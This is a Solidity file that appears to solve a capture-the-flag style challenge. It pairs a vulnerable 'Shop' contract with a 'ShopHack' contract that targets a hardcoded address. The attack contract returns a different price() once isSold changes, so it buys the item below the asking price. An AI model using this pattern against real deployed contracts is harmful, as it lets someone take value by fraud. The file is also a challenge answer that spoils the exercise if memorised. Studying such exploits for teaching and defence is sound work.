// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopHack {
    Shop public shop = Shop(0x55C2EEd1550688C3a921fE36184215Eb3e7F8C40);

    function exec() public {
        shop.buy();
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 1 : 100;
    }
}